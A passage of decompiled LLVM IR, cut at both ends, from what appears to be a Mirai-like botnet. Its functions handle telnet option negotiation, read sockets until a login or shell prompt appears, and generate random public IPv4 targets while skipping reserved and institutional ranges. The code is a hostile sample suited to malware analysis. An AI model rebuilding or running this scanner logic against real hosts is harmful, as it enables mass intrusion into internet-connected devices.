  store i32 %v2_a174, i32* @r0, align 4
  %v0_a17c = call i32 @free()
  store i32 %v1_a088, i32* @global_var_2a3fc.69, align 4
  br label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry, %dec_label_pc_a14c
  store i32 %v3_a018, i32* @r4, align 4
  store i32 %v6_a018, i32* @r5, align 4
  store i32 %v9_a018, i32* @r6, align 4
  ret i32 %v0_a024

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a0a4, { 1, 0 }
  uselistorder i32 %v1_a088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a194, { 1, 0 }
  uselistorder label %dec_label_pc_a0e0, { 1, 0 }
  uselistorder label %dec_label_pc_a0a0, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a1cc = add i32 %arg2, 1
  %v1_a1d0 = inttoptr i32 %v1_a1cc to i8*
  %v2_a1d0 = load i8, i8* %v1_a1d0, align 1
  %v7_a1dc = icmp ult i8 %v2_a1d0, -5
  br i1 %v7_a1dc, label %dec_label_pc_a328, label %dec_label_pc_a1e4

dec_label_pc_a1e4:                                ; preds = %entry
  %v7_a1ec = icmp eq i8 %v2_a1d0, -1
  br i1 %v7_a1ec, label %dec_label_pc_a1f0, label %dec_label_pc_a20c

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1e4
  br label %dec_label_pc_a328

dec_label_pc_a20c:                                ; preds = %dec_label_pc_a1e4
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a228 = bitcast i8* %stack_var_-17 to i32*
  %v6_a228 = call i32 @__libc_send(i32 %arg1, i32* %v5_a228, i32 1, i32 16384)
  %v2_a234 = load i8, i8* %v1_a1d0, align 1
  %v7_a238 = icmp eq i8 %v2_a234, -4
  br i1 %v7_a238, label %dec_label_pc_a240, label %dec_label_pc_a24c

dec_label_pc_a240:                                ; preds = %dec_label_pc_a20c
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a20c
  %v2_a254 = load i8, i8* %v1_a1d0, align 1
  %v7_a258 = icmp eq i8 %v2_a254, -2
  br i1 %v7_a258, label %dec_label_pc_a260, label %dec_label_pc_a26c

dec_label_pc_a260:                                ; preds = %dec_label_pc_a24c
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a24c
  %v2_a274 = load i8, i8* %v1_a1d0, align 1
  %v7_a278 = icmp eq i8 %v2_a274, 3
  %v7_a28c = icmp eq i8 %v2_a274, -3
  br i1 %v7_a278, label %dec_label_pc_a280, label %dec_label_pc_a2b8

dec_label_pc_a280:                                ; preds = %dec_label_pc_a26c
  br i1 %v7_a28c, label %dec_label_pc_a294, label %dec_label_pc_a2a0

dec_label_pc_a294:                                ; preds = %dec_label_pc_a280
  br label %dec_label_pc_a2a8

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a280
  br label %dec_label_pc_a2a8

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a2a0
  %storemerge = phi i8 [ -3, %dec_label_pc_a2a0 ], [ -5, %dec_label_pc_a294 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a2b8:                                ; preds = %dec_label_pc_a26c
  br i1 %v7_a28c, label %dec_label_pc_a2cc, label %dec_label_pc_a2d8

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a2e0

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2cc, %dec_label_pc_a2d8
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a2d8 ], [ -4, %dec_label_pc_a2cc ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2a8, %dec_label_pc_a260, %dec_label_pc_a240, %dec_label_pc_a2e0
  %v5_a300 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a228, i32 1, i32 16384)
  %v1_a308 = add i32 %arg2, 2
  %v4_a31c = inttoptr i32 %v1_a308 to i32*
  %v5_a31c = call i32 @__libc_send(i32 %arg1, i32* %v4_a31c, i32 1, i32 16384)
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2ec, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0 }
  uselistorder label %dec_label_pc_a2a8, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a358 = call i32 @strlen(i8* %arg1)
  %v2_a3a0 = add i32 %v3_a358, %tmp
  br label %dec_label_pc_a474

dec_label_pc_a378:                                ; preds = %dec_label_pc_a400, %dec_label_pc_a3dc, %dec_label_pc_a3b8, %dec_label_pc_a394
  %v1_a37c = add nsw i32 %stack_var_-24.014, 1
  %v7_a390 = icmp sgt i32 %v3_a358, %v1_a37c
  br i1 %v7_a390, label %dec_label_pc_a394, label %dec_label_pc_a424

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384.preheader, %dec_label_pc_a378
  %stack_var_-24.014 = phi i32 [ %v1_a37c, %dec_label_pc_a378 ], [ %stack_var_-24.1, %dec_label_pc_a384.preheader ]
  %v2_a3a8 = sub i32 %v2_a3a0, %stack_var_-24.014
  %v1_a3ac = inttoptr i32 %v2_a3a8 to i8*
  %v2_a3ac = load i8, i8* %v1_a3ac, align 1
  %v2_a3b0 = icmp eq i8 %v2_a3ac, 0
  br i1 %v2_a3b0, label %dec_label_pc_a378, label %dec_label_pc_a3b8

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a394
  %v2_a3d0 = load i8, i8* %v1_a3ac, align 1
  %v7_a3d4 = icmp eq i8 %v2_a3d0, 32
  br i1 %v7_a3d4, label %dec_label_pc_a378, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3b8
  %v2_a3f4 = load i8, i8* %v1_a3ac, align 1
  %v7_a3f8 = icmp eq i8 %v2_a3f4, 13
  br i1 %v7_a3f8, label %dec_label_pc_a378, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a3dc
  %v2_a418 = load i8, i8* %v1_a3ac, align 1
  %v7_a41c = icmp eq i8 %v2_a418, 10
  br i1 %v7_a41c, label %dec_label_pc_a378, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a400, %dec_label_pc_a378, %dec_label_pc_a384.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a384.preheader ], [ %stack_var_-24.014, %dec_label_pc_a400 ], [ %v1_a37c, %dec_label_pc_a378 ]
  %v2_a438 = sub i32 %v2_a3a0, %stack_var_-24.0.lcssa
  %v1_a43c = inttoptr i32 %v2_a438 to i8*
  %v2_a43c = load i8, i8* %v1_a43c, align 1
  %v2_a44c = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_193e0.71 to i32)
  %v1_a450 = inttoptr i32 %v2_a44c to i8*
  %v2_a450 = load i8, i8* %v1_a450, align 1
  %v9_a454 = icmp eq i8 %v2_a43c, %v2_a450
  %v1_a46c = add i32 %storemerge3, 1
  br i1 %v9_a454, label %dec_label_pc_a494, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a424, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a424 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a46c, %dec_label_pc_a424 ]
  %v3_a47c = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_193e0.71, i32 0, i32 0))
  %v3_a484 = icmp ult i32 %storemerge3, %v3_a47c
  br i1 %v3_a484, label %dec_label_pc_a384.preheader, label %dec_label_pc_a494

dec_label_pc_a384.preheader:                      ; preds = %dec_label_pc_a474
  %v7_a39013 = icmp sgt i32 %v3_a358, %stack_var_-24.1
  br i1 %v7_a39013, label %dec_label_pc_a394, label %dec_label_pc_a424

dec_label_pc_a494:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a424
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a424 ], [ 0, %dec_label_pc_a474 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a358, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a424, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a4ac = load i32, i32* @fp, align 4
  store i32 %v3_a4ac, i32* %stack_var_-16, align 4
  %v13_a4ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4fc = ptrtoint i32* %stack_var_-168 to i32
  %v3_a53c = udiv i32 %arg1, 32
  %v3_a548 = mul nuw nsw i32 %v3_a53c, 4
  %v1_a560 = urem i32 %arg1, 32
  %v6_a568 = shl i32 1, %v1_a560
  %v1_a58c = add i32 %arg1, 1
  %v2_a594 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a6b4 = inttoptr i32 %arg2 to i8*
  %v2_a6c8 = icmp eq i32 %arg3, 0
  %v1_a6d4 = inttoptr i32 %arg6 to i8*
  %v5_a718 = icmp sgt i32 %arg5, 0
  %v2_a550 = add nsw i32 %v3_a548, -152
  %v2_a554 = add i32 %v2_a550, %v13_a4ac
  %v1_a558 = inttoptr i32 %v2_a554 to i32*
  br label %dec_label_pc_a6f0

dec_label_pc_a510.lr.ph:                          ; preds = %dec_label_pc_a704, %dec_label_pc_a710
  br label %dec_label_pc_a510

dec_label_pc_a510:                                ; preds = %dec_label_pc_a510.lr.ph, %dec_label_pc_a510
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a510.lr.ph ], [ %v1_a524, %dec_label_pc_a510 ]
  %v5_a51c = mul nuw nsw i32 %storemerge27, 4
  %v6_a51c = add i32 %v5_a51c, %v2_a4fc
  %v7_a51c = inttoptr i32 %v6_a51c to i32*
  store i32 0, i32* %v7_a51c, align 4
  %v1_a524 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a524, 32
  br i1 %tmp30, label %dec_label_pc_a510, label %dec_label_pc_a538

dec_label_pc_a538:                                ; preds = %dec_label_pc_a510
  %v2_a558 = load i32, i32* %v1_a558, align 4
  %v2_a56c = or i32 %v2_a558, %v6_a568
  store i32 %v2_a56c, i32* %v1_a558, align 4
  %v5_a5a8 = call i32 @__libc_select(i32 %v1_a58c, i32 %v2_a4fc, i32 0, i32 0, i32 %v2_a594)
  %tmp31 = icmp slt i32 %v5_a5a8, 1
  br i1 %tmp31, label %dec_label_pc_a734, label %dec_label_pc_a5b8

dec_label_pc_a5b8:                                ; preds = %dec_label_pc_a538
  %v2_a5c4 = add i32 %stack_var_-40.0, %arg6
  %v5_a5c8 = inttoptr i32 %v2_a5c4 to i8*
  %v6_a5dc = inttoptr i32 %v2_a5c4 to i32*
  %v7_a5dc = call i32 @__libc_recv(i32 %arg1, i32* %v6_a5dc, i32 1, i32 0, i32 %v2_a5c4)
  %v7_a5ec = icmp eq i32 %v7_a5dc, -1
  br i1 %v7_a5ec, label %dec_label_pc_a600, label %dec_label_pc_a5f4

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5b8
  %v2_a5f8 = icmp eq i32 %v7_a5dc, 0
  br i1 %v2_a5f8, label %dec_label_pc_a600, label %dec_label_pc_a60c

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a5b8
  br label %dec_label_pc_a73c

dec_label_pc_a60c:                                ; preds = %dec_label_pc_a5f4
  %v2_a614 = add i32 %v7_a5dc, %stack_var_-40.0
  %v2_a620 = load i8, i8* %v5_a5c8, align 1
  %v2_a624 = icmp eq i8 %v2_a620, -1
  br i1 %v2_a624, label %dec_label_pc_a62c, label %dec_label_pc_a6ac

dec_label_pc_a62c:                                ; preds = %dec_label_pc_a60c
  %v1_a630 = add i32 %v2_a5c4, 1
  %v5_a644 = inttoptr i32 %v1_a630 to i32*
  %v6_a644 = call i32 @__libc_recv(i32 %arg1, i32* %v5_a644, i32 2, i32 0, i32 %v2_a614)
  %v7_a654 = icmp eq i32 %v6_a644, -1
  br i1 %v7_a654, label %dec_label_pc_a668, label %dec_label_pc_a65c

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a62c
  %v2_a660 = icmp eq i32 %v6_a644, 0
  br i1 %v2_a660, label %dec_label_pc_a668, label %dec_label_pc_a674

dec_label_pc_a668:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a62c
  br label %dec_label_pc_a73c

dec_label_pc_a674:                                ; preds = %dec_label_pc_a65c
  %v2_a67c = add i32 %v6_a644, %v2_a614
  %v5_a690 = call i32 @negotiate(i32 %arg1, i32 %v2_a5c4, i32 3, i32 %v2_a67c, i32 %v2_a67c)
  %v2_a698 = icmp eq i32 %v5_a690, 0
  br i1 %v2_a698, label %dec_label_pc_a6a0, label %dec_label_pc_a6f0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a674
  br label %dec_label_pc_a73c

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a60c
  %v3_a620 = zext i8 %v2_a620 to i32
  %v7_a6b4 = call i32 @strstr(i32 %arg6, i8* %v6_a6b4, i32 %stack_var_-40.0, i32 %v3_a620, i32 %v2_a614, i32 %v7_a5dc)
  %v2_a6bc = icmp eq i32 %v7_a6b4, 0
  br i1 %v2_a6bc, label %dec_label_pc_a6c4, label %dec_label_pc_a728

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6ac
  br i1 %v2_a6c8, label %dec_label_pc_a6f0, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6c4
  %v2_a6d4 = call i32 @matchPrompt(i8* %v1_a6d4)
  %v2_a6dc = icmp eq i32 %v2_a6d4, 0
  br i1 %v2_a6dc, label %dec_label_pc_a6f0, label %dec_label_pc_a728

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a674, %dec_label_pc_a6d0, %dec_label_pc_a6c4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a67c, %dec_label_pc_a674 ], [ %v2_a614, %dec_label_pc_a6c4 ], [ %v2_a614, %dec_label_pc_a6d0 ]
  %v1_a6f4 = add i32 %stack_var_-40.0, 2
  %v6_a700 = icmp slt i32 %v1_a6f4, %arg7
  br i1 %v6_a700, label %dec_label_pc_a704, label %dec_label_pc_a734

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6f0
  %v3_a704 = load i32, i32* %stack_var_-176, align 4
  %v5_a70c = icmp sgt i32 %v3_a704, 0
  br i1 %v5_a70c, label %dec_label_pc_a510.lr.ph, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  br i1 %v5_a718, label %dec_label_pc_a510.lr.ph, label %dec_label_pc_a734

dec_label_pc_a728:                                ; preds = %dec_label_pc_a6ac, %dec_label_pc_a6d0
  br label %dec_label_pc_a73c

dec_label_pc_a734:                                ; preds = %dec_label_pc_a538, %dec_label_pc_a710, %dec_label_pc_a6f0
  br label %dec_label_pc_a73c

dec_label_pc_a73c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a668, %dec_label_pc_a600, %dec_label_pc_a734
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a734 ], [ 1, %dec_label_pc_a728 ], [ 0, %dec_label_pc_a600 ], [ 0, %dec_label_pc_a668 ], [ 0, %dec_label_pc_a6a0 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v6_a644, { 1, 2, 0 }
  uselistorder i8 %v2_a620, { 1, 0 }
  uselistorder i32 %v2_a614, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v7_a5dc, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4fc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a73c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a734, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a728, { 1, 0 }
  uselistorder label %dec_label_pc_a6f0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a510, { 1, 0 }
  uselistorder label %dec_label_pc_a510.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a750 = load i32, i32* @r4, align 4
  %v6_a750 = load i32, i32* @fp, align 4
  store i32 42840, i32* %stack_var_-4, align 4
  %v2_a754 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a754, i32* @fp, align 4
  %v0_a75c = call i32 @random()
  %v2_a76c = srem i32 %v0_a75c, 223
  %v1_a77c = trunc i32 %v2_a76c to i8
  store i8 %v1_a77c, i8* bitcast (i8** @global_var_2418b.73 to i8*), align 4
  %v0_a780 = call i32 @random()
  %v2_a790 = srem i32 %v0_a780, 255
  %v1_a7a0 = trunc i32 %v2_a790 to i8
  store i8 %v1_a7a0, i8* @global_var_2418c.74, align 1
  %v0_a7a4 = call i32 @random()
  %v2_a7b4 = srem i32 %v0_a7a4, 255
  %v1_a7c4 = trunc i32 %v2_a7b4 to i8
  store i8 %v1_a7c4, i8* @global_var_2418d.75, align 1
  %v0_a7c8 = call i32 @random()
  br label %dec_label_pc_a880

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_aa80, %dec_label_pc_aa70, %dec_label_pc_aa60, %dec_label_pc_aa50, %dec_label_pc_aa40, %dec_label_pc_aa30, %dec_label_pc_aa20, %dec_label_pc_aa10, %dec_label_pc_aa00, %dec_label_pc_a9f0, %dec_label_pc_a9e0, %dec_label_pc_a9d0, %dec_label_pc_a9c0, %dec_label_pc_a9b0, %dec_label_pc_a980, %dec_label_pc_a960, %dec_label_pc_a930, %dec_label_pc_a900, %dec_label_pc_a8e0, %dec_label_pc_a8d0, %dec_label_pc_a8c0, %dec_label_pc_a8b0, %dec_label_pc_a8a0, %dec_label_pc_a890, %dec_label_pc_a880
  %v0_a7f0 = call i32 @random()
  %v2_a800 = srem i32 %v0_a7f0, 223
  %v1_a810 = trunc i32 %v2_a800 to i8
  store i8 %v1_a810, i8* bitcast (i8** @global_var_2418b.73 to i8*), align 4
  %v0_a814 = call i32 @random()
  %v2_a824 = srem i32 %v0_a814, 255
  %v1_a834 = trunc i32 %v2_a824 to i8
  store i8 %v1_a834, i8* @global_var_2418c.74, align 1
  %v0_a838 = call i32 @random()
  %v2_a848 = srem i32 %v0_a838, 255
  %v1_a858 = trunc i32 %v2_a848 to i8
  store i8 %v1_a858, i8* @global_var_2418d.75, align 1
  %v0_a85c = call i32 @random()
  br label %dec_label_pc_a880

dec_label_pc_a880:                                ; preds = %entry, %dec_label_pc_a7f0
  %storemerge7 = phi i32 [ %v0_a7c8, %entry ], [ %v0_a85c, %dec_label_pc_a7f0 ]
  %v2_a7d8 = srem i32 %storemerge7, 255
  %extract.t4 = trunc i32 %v2_a7d8 to i8
  store i8 %extract.t4, i8* @global_var_2418e.76, align 1
  %v2_a884 = load i8, i8* bitcast (i8** @global_var_2418b.73 to i8*), align 4
  %v3_a884 = zext i8 %v2_a884 to i32
  %v7_a888 = icmp eq i8 %v2_a884, 127
  br i1 %v7_a888, label %dec_label_pc_a7f0, label %dec_label_pc_a890

dec_label_pc_a890:                                ; preds = %dec_label_pc_a880
  %v2_a898 = icmp eq i8 %v2_a884, 0
  br i1 %v2_a898, label %dec_label_pc_a7f0, label %dec_label_pc_a8a0

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a890
  %v7_a8a8 = icmp eq i8 %v2_a884, 3
  br i1 %v7_a8a8, label %dec_label_pc_a7f0, label %dec_label_pc_a8b0

dec_label_pc_a8b0:                                ; preds = %dec_label_pc_a8a0
  %v7_a8b8 = icmp eq i8 %v2_a884, 15
  br i1 %v7_a8b8, label %dec_label_pc_a7f0, label %dec_label_pc_a8c0

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a8b0
  %v7_a8c8 = icmp eq i8 %v2_a884, 16
  br i1 %v7_a8c8, label %dec_label_pc_a7f0, label %dec_label_pc_a8d0

dec_label_pc_a8d0:                                ; preds = %dec_label_pc_a8c0
  %v7_a8d8 = icmp eq i8 %v2_a884, 56
  br i1 %v7_a8d8, label %dec_label_pc_a7f0, label %dec_label_pc_a8e0

dec_label_pc_a8e0:                                ; preds = %dec_label_pc_a8d0
  %v7_a8e8 = icmp eq i8 %v2_a884, 10
  br i1 %v7_a8e8, label %dec_label_pc_a7f0, label %dec_label_pc_a8f0

dec_label_pc_a8f0:                                ; preds = %dec_label_pc_a8e0
  %v7_a8f8 = icmp eq i8 %v2_a884, -64
  br i1 %v7_a8f8, label %dec_label_pc_a900, label %dec_label_pc_a910

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8f0
  %v3_a904 = load i8, i8* @global_var_2418c.74, align 1
  %v7_a908 = icmp eq i8 %v3_a904, -88
  br i1 %v7_a908, label %dec_label_pc_a7f0, label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %dec_label_pc_a8f0, %dec_label_pc_a900
  %v7_a918 = icmp eq i8 %v2_a884, -84
  br i1 %v7_a918, label %dec_label_pc_a920, label %dec_label_pc_a940

dec_label_pc_a920:                                ; preds = %dec_label_pc_a910
  %v3_a924 = load i8, i8* @global_var_2418c.74, align 1
  %tmp = icmp ult i8 %v3_a924, 16
  br i1 %tmp, label %dec_label_pc_a940, label %dec_label_pc_a930

dec_label_pc_a930:                                ; preds = %dec_label_pc_a920
  %tmp19 = icmp ult i8 %v3_a924, 32
  br i1 %tmp19, label %dec_label_pc_a7f0, label %dec_label_pc_a940

dec_label_pc_a940:                                ; preds = %dec_label_pc_a910, %dec_label_pc_a930, %dec_label_pc_a920
  %v7_a948 = icmp eq i8 %v2_a884, 100
  br i1 %v7_a948, label %dec_label_pc_a950, label %dec_label_pc_a970

dec_label_pc_a950:                                ; preds = %dec_label_pc_a940
  %v3_a954 = load i8, i8* @global_var_2418c.74, align 1
  %tmp20 = icmp ult i8 %v3_a954, 64
  br i1 %tmp20, label %dec_label_pc_a970, label %dec_label_pc_a960

dec_label_pc_a960:                                ; preds = %dec_label_pc_a950
  %tmp21 = icmp ult i8 %v3_a954, 127
  br i1 %tmp21, label %dec_label_pc_a7f0, label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %dec_label_pc_a940, %dec_label_pc_a960, %dec_label_pc_a950
  %v7_a978 = icmp eq i8 %v2_a884, -87
  br i1 %v7_a978, label %dec_label_pc_a980, label %dec_label_pc_a990

dec_label_pc_a980:                                ; preds = %dec_label_pc_a970
  %v3_a984 = load i8, i8* @global_var_2418c.74, align 1
  %v2_a988 = icmp eq i8 %v3_a984, -1
  br i1 %v2_a988, label %dec_label_pc_a7f0, label %dec_label_pc_a990

dec_label_pc_a990:                                ; preds = %dec_label_pc_a970, %dec_label_pc_a980
  %v7_a998 = icmp eq i8 %v2_a884, -58
  br i1 %v7_a998, label %dec_label_pc_a9a0, label %dec_label_pc_a9c0

dec_label_pc_a9a0:                                ; preds = %dec_label_pc_a990
  %v3_a9a4 = load i8, i8* @global_var_2418c.74, align 1
  %tmp22 = icmp ult i8 %v3_a9a4, 18
  br i1 %tmp22, label %dec_label_pc_a9c0, label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9a0
  %tmp23 = or i8 %v3_a9a4, 1
  %tmp24 = icmp eq i8 %tmp23, 19
  br i1 %tmp24, label %dec_label_pc_a7f0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a990, %dec_label_pc_a9b0, %dec_label_pc_a9a0
  %v7_a9c8 = icmp eq i8 %v2_a884, -32
  br i1 %v7_a9c8, label %dec_label_pc_a7f0, label %dec_label_pc_a9d0

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_a9c0
  %v7_a9d8 = icmp eq i8 %v2_a884, 6
  br i1 %v7_a9d8, label %dec_label_pc_a7f0, label %dec_label_pc_a9e0

dec_label_pc_a9e0:                                ; preds = %dec_label_pc_a9d0
  %v7_a9e8 = icmp eq i8 %v2_a884, 7
  br i1 %v7_a9e8, label %dec_label_pc_a7f0, label %dec_label_pc_a9f0

dec_label_pc_a9f0:                                ; preds = %dec_label_pc_a9e0
  %v7_a9f8 = icmp eq i8 %v2_a884, 11
  br i1 %v7_a9f8, label %dec_label_pc_a7f0, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f0
  %v7_aa08 = icmp eq i8 %v2_a884, 21
  br i1 %v7_aa08, label %dec_label_pc_a7f0, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aa00
  %v7_aa18 = icmp eq i8 %v2_a884, 22
  br i1 %v7_aa18, label %dec_label_pc_a7f0, label %dec_label_pc_aa20

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa10
  %v7_aa28 = icmp eq i8 %v2_a884, 26
  br i1 %v7_aa28, label %dec_label_pc_a7f0, label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_aa20
  %v7_aa38 = icmp eq i8 %v2_a884, 28
  br i1 %v7_aa38, label %dec_label_pc_a7f0, label %dec_label_pc_aa40

dec_label_pc_aa40:                                ; preds = %dec_label_pc_aa30
  %v7_aa48 = icmp eq i8 %v2_a884, 29
  br i1 %v7_aa48, label %dec_label_pc_a7f0, label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa40
  %v7_aa58 = icmp eq i8 %v2_a884, 30
  br i1 %v7_aa58, label %dec_label_pc_a7f0, label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa50
  %v7_aa68 = icmp eq i8 %v2_a884, 33
  br i1 %v7_aa68, label %dec_label_pc_a7f0, label %dec_label_pc_aa70

dec_label_pc_aa70:                                ; preds = %dec_label_pc_aa60
  %v7_aa78 = icmp eq i8 %v2_a884, 55
  br i1 %v7_aa78, label %dec_label_pc_a7f0, label %dec_label_pc_aa80

dec_label_pc_aa80:                                ; preds = %dec_label_pc_aa70
  %v7_aa88 = icmp eq i8 %v2_a884, -42
  br i1 %v7_aa88, label %dec_label_pc_a7f0, label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa80
  %v7_aa98 = icmp eq i8 %v2_a884, -41
  br i1 %v7_aa98, label %dec_label_pc_a7f0, label %dec_label_pc_aaa0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa90
  %v2_aaa0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  %v3_aae8 = load i8, i8* @global_var_2418c.74, align 1
  %v4_aae8 = zext i8 %v3_aae8 to i32
  store i32 %v4_aae8, i32* @r4, align 4
  %v3_aaf4 = load i8, i8* @global_var_2418d.75, align 1
  %v6_ab1c = sext i8 %v3_aae8 to i32
  %v8_ab1c = sext i8 %v3_aaf4 to i32
  %v10_ab1c = sext i8 %extract.t4 to i32
  %v15_ab1c = call i32 @szprintf(i32 %v2_aaa0, i32 ptrtoint ([12 x i8]* @global_var_193e8.78 to i32), i32 %v3_a884, i32 %v6_ab1c, i32 %v8_ab1c, i32 %v10_ab1c, i32 0, i32 0, i32 0, i32 0)
  store i32 %v2_aaa0, i32* @r0, align 4
  %v1_ab28 = call i32 @inet_addr(i32 %v2_aaa0)
  store i32 %v3_a750, i32* @r4, align 4
  store i32 %v6_a750, i32* @fp, align 4
  ret i32 %v1_ab28

; uselistorder directives
  uselistorder i32 %v2_aaa0, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2418d.75, { 2, 1, 0 }
  uselistorder i8* @global_var_2418c.74, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2418b.73 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a990, { 1, 0 }
